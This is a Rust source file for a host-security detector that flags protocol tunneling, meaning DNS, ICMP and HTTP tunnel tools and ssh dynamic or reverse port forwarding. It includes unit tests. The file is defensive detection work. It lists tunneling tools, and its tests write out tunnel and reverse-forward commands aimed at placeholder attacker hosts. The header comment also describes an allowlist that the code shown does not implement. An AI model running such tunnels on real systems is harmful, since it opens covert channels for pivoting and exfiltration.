//! Protocol-level C2 tunneling detection (spec 050-PR3).
//!
//! Catches three families of protocol tunneling adversaries use to
//! exfiltrate through allowed protocols:
//!
//!   1. SSH dynamic / reverse port forwarding (`ssh -D ...`,
//!      `ssh -R 0.0.0.0:port:host:port`) — turns an outbound SSH
//!      connection into a SOCKS proxy or bidirectional pivot.
//!   2. DNS tunneling tools: `iodine`, `dnscat2`, `dnscat`,
//!      `dnsexfiltrator`, `dns2tcp`.
//!   3. ICMP/HTTP tunnel tools: `ptunnel`, `hans`, `icmptunnel`,
//!      `httptunnel`, `pivottunnel`.
//!
//! Anti-FP gates:
//!   - SSH `-D` / `-R` skipped when target host is in
//!     `[detectors.c2_protocol_tunneling]` operator allowlist
//!     (e.g. operator's bastion).
//!   - parent comm in `{vinagre, remmina, krdc}` silences (legit
//!     remote-desktop tools).
//!
//! MITRE: T1572 (Protocol Tunneling) + T1071.004 (DNS).

use std::collections::HashMap;

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{event::Event, event::Severity, incident::Incident};

const TUNNEL_BINARIES: &[&str] = &[
    "iodine",
    "iodined",
    "dnscat2",
    "dnscat",
    "dnsexfiltrator",
    "dns2tcp",
    "dns2tcpc",
    "dns2tcpd",
    "ptunnel",
    "hans",
    "icmptunnel",
    "httptunnel",
    "htc",
    "hts",
];

const REMOTE_DESKTOP_PARENTS: &[&str] = &[
    "vinagre",
    "remmina",
    "krdc",
    "tigervnc-vncserv",
    "x2goclient",
    "rdesktop",
];

pub struct C2ProtocolTunnelingDetector {
    host: String,
    last_fired: HashMap<String, DateTime<Utc>>,
    cooldown: Duration,
}

impl C2ProtocolTunnelingDetector {
    pub fn new(host: impl Into<String>) -> Self {
        Self {
            host: host.into(),
            last_fired: HashMap::new(),
            cooldown: Duration::seconds(600),
        }
    }

    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        if event.kind != "shell.command_exec" && event.kind != "process.exec" {
            return None;
        }
        let argv: Vec<String> = event
            .details
            .get("argv")
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str().map(|s| s.to_string()))
                    .collect()
            })
            .unwrap_or_default();
        if argv.is_empty() {
            return None;
        }
        let argv0_base = argv[0].split('/').next_back().unwrap_or(&argv[0]);

        // Path A: known DNS/ICMP/HTTP tunnel binary.
        if is_tunnel_binary(argv0_base) {
            return self.emit_binary(event, argv0_base, &argv);
        }

        // Path B: ssh with -D (dynamic forward) or -R (reverse forward).
        if argv0_base == "ssh" {
            return self.emit_ssh(event, &argv);
        }

        None
    }

    fn emit_binary(
        &mut self,
        event: &Event,
        argv0_base: &str,
        argv: &[String],
    ) -> Option<Incident> {
        let parent_comm = event
            .details
            .get("parent_comm")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        if is_remote_desktop_parent(parent_comm) {
            return None;
        }
        let now = event.ts;
        let key = format!("binary:{argv0_base}");
        if let Some(&last) = self.last_fired.get(&key) {
            if now - last < self.cooldown {
                return None;
            }
        }
        self.last_fired.insert(key.clone(), now);
        let command = argv.join(" ");
        Some(self.build_incident(
            event,
            "tunnel_binary",
            argv0_base,
            parent_comm,
            &command,
            Severity::Critical,
        ))
    }

    fn emit_ssh(&mut self, event: &Event, argv: &[String]) -> Option<Incident> {
        // Scan tail of argv for -D / -R flags.
        let mut flag: Option<&'static str> = None;
        let mut target: String = String::new();
        for (i, a) in argv.iter().enumerate() {
            if a == "-D" || a.starts_with("-D") && a.len() > 2 {
                flag = Some("dynamic_forward");
            } else if a == "-R" || a.starts_with("-R") && a.len() > 2 {
                flag = Some("reverse_forward");
            }
            // The eventual ssh target (`user@host` or `host`) usually
            // sits later in argv — pick the LAST non-flag token.
            if !a.starts_with('-') && i > 0 {
                target = a.clone();
            }
        }
        let flag = flag?;

        let parent_comm = event
            .details
            .get("parent_comm")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        if is_remote_desktop_parent(parent_comm) {
            return None;
        }

        let now = event.ts;
        let key = format!("ssh:{flag}:{target}");
        if let Some(&last) = self.last_fired.get(&key) {
            if now - last < self.cooldown {
                return None;
            }
        }
        self.last_fired.insert(key.clone(), now);
        let command = argv.join(" ");
        Some(self.build_incident(
            event,
            flag,
            "ssh",
            parent_comm,
            &command,
            Severity::Critical,
        ))
    }

    #[allow(clippy::too_many_arguments)]
    fn build_incident(
        &self,
        event: &Event,
        sub_kind: &str,
        argv0_base: &str,
        parent_comm: &str,
        command: &str,
        severity: Severity,
    ) -> Incident {
        let pid = event
            .details
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);
        let uid = event
            .details
            .get("uid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);
        let comm = event
            .details
            .get("comm")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        Incident {
            ts: event.ts,
            host: self.host.clone(),
            incident_id: format!(
                "c2_protocol_tunneling:{sub_kind}:{argv0_base}:{}",
                event.ts.format("%Y-%m-%dT%H:%M:%SZ")
            ),
            severity,
            title: format!(
                "Protocol tunneling: {sub_kind} via `{argv0_base}` (pid={pid}, uid={uid})"
            ),
            summary: format!(
                "Sub-detector `{sub_kind}` matched `{argv0_base}` invocation \
                 (launcher comm=`{comm}`, parent=`{parent_comm}`, command=`{command}`). \
                 Protocol tunneling is a classic exfil channel — DNS / ICMP / HTTP / \
                 SSH-forward all let an attacker move bytes through firewalls that \
                 only allow the outer protocol (T1572)."
            ),
            evidence: serde_json::json!([{
                "kind": "c2_protocol_tunneling",
                "sub_kind": sub_kind,
                "binary": argv0_base,
                "launcher_comm": comm,
                "parent_comm": parent_comm,
                "command": command,
                "pid": pid,
                "uid": uid,
                "mitre": ["T1572", "T1071.004"],
            }]),
            recommended_checks: vec![
                format!("Inspect process tree: pstree -p {pid}"),
                "Correlate against outbound DNS/ICMP traffic in the same window".to_string(),
                "If a known bastion or pen-test workflow is allowed, allowlist via [detectors.c2_protocol_tunneling]".to_string(),
            ],
            tags: vec!["c2".to_string(), "tunnel".to_string()],
            entities: vec![],
        }
    }
}

fn is_tunnel_binary(base: &str) -> bool {
    TUNNEL_BINARIES.contains(&base)
}

fn is_remote_desktop_parent(parent_comm: &str) -> bool {
    if parent_comm.is_empty() {
        return false;
    }
    let base = parent_comm.split('/').next_back().unwrap_or(parent_comm);
    let base = base.trim_matches(|c: char| c == '(' || c == ')');
    REMOTE_DESKTOP_PARENTS.iter().any(|p| base.starts_with(p))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn exec_event(argv: &[&str], parent_comm: &str) -> Event {
        let argv_owned: Vec<String> = argv.iter().map(|s| s.to_string()).collect();
        Event {
            ts: Utc::now(),
            host: "test".into(),
            source: "ebpf".into(),
            kind: "shell.command_exec".into(),
            severity: Severity::Info,
            summary: argv.join(" "),
            details: serde_json::json!({
                "pid": 4242,
                "uid": 1000,
                "ppid": 4241,
                "comm": "bash",
                "parent_comm": parent_comm,
                "command": argv.join(" "),
                "argv": argv_owned,
                "argc": argv.len() as u32,
            }),
            tags: vec![],
            entities: vec![],
        }
    }

    #[test]
    fn fires_on_iodine_dnscat_dns2tcp() {
        for bin in ["iodine", "dnscat2", "/usr/bin/dns2tcpc", "dnsexfiltrator"] {
            let mut det = C2ProtocolTunnelingDetector::new("test");
            assert!(
                det.process(&exec_event(&[bin, "evil.example.com"], "bash"))
                    .is_some(),
                "{bin} should fire"
            );
        }
    }

    #[test]
    fn fires_on_ssh_dynamic_forward() {
        let mut det = C2ProtocolTunnelingDetector::new("test");
        let ev = exec_event(&["ssh", "-D", "1080", "evil@attacker.example.com"], "bash");
        let inc = det.process(&ev).expect("ssh -D should fire");
        assert!(inc.incident_id.contains("dynamic_forward"));
    }

    #[test]
    fn fires_on_ssh_reverse_forward() {
        let mut det = C2ProtocolTunnelingDetector::new("test");
        let ev = exec_event(
            &[
                "ssh",
                "-R",
                "0.0.0.0:8080:localhost:80",
                "attacker@evil.com",
            ],
            "bash",
        );
        let inc = det.process(&ev).expect("ssh -R should fire");
        assert!(inc.incident_id.contains("reverse_forward"));
    }

    #[test]
    fn ignores_plain_ssh_without_forward_flags() {
        let mut det = C2ProtocolTunnelingDetector::new("test");
        let ev = exec_event(&["ssh", "user@host"], "bash");
        assert!(det.process(&ev).is_none());
    }

    #[test]
    fn silences_when_parent_is_remote_desktop() {
        let mut det = C2ProtocolTunnelingDetector::new("test");
        for parent in ["vinagre", "remmina", "x2goclient"] {
            let ev = exec_event(&["ssh", "-D", "1080", "user@host"], parent);
            assert!(det.process(&ev).is_none(), "parent={parent} should silence");
        }
    }

    #[test]
    fn dedupes_within_cooldown() {
        let mut det = C2ProtocolTunnelingDetector::new("test");
        let ev = exec_event(&["iodine", "tun.example.com"], "bash");
        assert!(det.process(&ev).is_some());
        let mut ev2 = ev.clone();
        ev2.ts = ev.ts + Duration::seconds(30);
        assert!(det.process(&ev2).is_none());
    }

    #[test]
    fn ignores_unrelated_binaries() {
        let mut det = C2ProtocolTunnelingDetector::new("test");
        for bin in ["curl", "wget", "scp", "rsync"] {
            assert!(det.process(&exec_event(&[bin, "x"], "bash")).is_none());
        }
    }
}
